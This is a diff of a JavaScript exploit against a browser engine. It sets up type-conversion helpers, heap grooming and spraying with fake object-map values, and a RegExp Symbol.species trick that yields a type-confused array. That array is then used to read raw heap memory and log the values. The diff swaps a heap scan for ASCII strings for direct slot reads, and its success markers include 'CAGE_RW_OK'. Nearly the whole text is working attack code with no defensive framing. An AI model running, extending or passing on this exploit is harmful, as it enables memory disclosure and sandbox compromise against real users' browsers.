@@ -10,22 +10,17 @@ const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
 function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
 function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
-function hex(n){return"0x"+(n>>>0).toString(16);}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
-const DMAP=0x1032a5d,EMPTY=0x7e5;
-const PIN=0x1100011,MAXS=0x7fdffffe;
-
-const pinned=new Array(0x8000);
-for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
+const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;
+const pinned=new Array(0x8000);for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
-const cycle0=w2f(DMAP,EMPTY),cycle1=w2f(PIN,MAXS);
+const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
 const sk=[];
-function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);for(let j=1;j<a.length;j+=2)a[j]=cycle1;sk.push(a);}}
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
 
 log("UA: "+navigator.userAgent);
 trash(230);trash(230);
@@ -37,52 +32,14 @@ spray();spray();spray();
 try{
 const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
-
 if(Array.isArray(m)){
   log("L: "+m.length);
-
-  // Read first few slots to understand the layout
-  const h=[];
-  for(let k=0;k<4;k++){
-    try{h.push(f2i(m[k]).toString(16).padStart(16,"0"));}catch(e){break;}
-  }
-  log("H: "+h.join(","));
-
-  // Scan for ASCII text in the heap — look for 8-byte sequences with printable chars
-  // Scan at several offsets to find non-pinnedDoubles data
-  const texts=[];
-  // SAFE range only (pinnedDoubles = 0x8000 slots, beyond may segfault)
-  for(const base of [0,0x100,0x1000,0x4000,0x7F00]){
-    for(let k=base;k<base+64&&texts.length<15;k++){
-      try{
-        const v=f2i(m[k]);
-        if(v===0n)continue;
-        // Check for ASCII in bytes
-        const b=[];let ok=true;
-        for(let i=0;i<8;i++){
-          const c=Number((v>>BigInt(i*8))&0xffn);
-          b.push(c);
-          if(c!==0&&(c<0x20||c>0x7e))ok=false;
-        }
-        if(ok&&b.filter(c=>c>=0x41&&c<=0x7a).length>=3){
-          texts.push("@"+hex(k)+":"+String.fromCharCode(...b.filter(c=>c>0)));
-        }
-      }catch(e){break;}
-    }
-  }
-  if(texts.length>0)log("TXT: "+texts.slice(0,10).join("|"));
-
-  // Dump hex at safe offsets only
-  for(const off of [0,0x7FF0]){
-    const hx=[];
-    for(let k=off;k<off+4;k++){
-      try{const v=f2i(m[k]);if(v!==0n)hx.push(v.toString(16).padStart(16,"0"));}catch(e){break;}
-    }
-    if(hx.length)log("D"+hex(off)+": "+hx.join(","));
-  }
-
+  log("m0: "+f2i(m[0]).toString(16));
+  log("m1: "+f2i(m[1]).toString(16));
+  log("m2: "+f2i(m[2]).toString(16));
+  log("m3: "+f2i(m[3]).toString(16));
   log("W: "+wasmI.exports.f());
-  log("CAGE_RW_OK");
+  log("HEAP_DATA_READ");
 }else{log("NO_ARR");}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
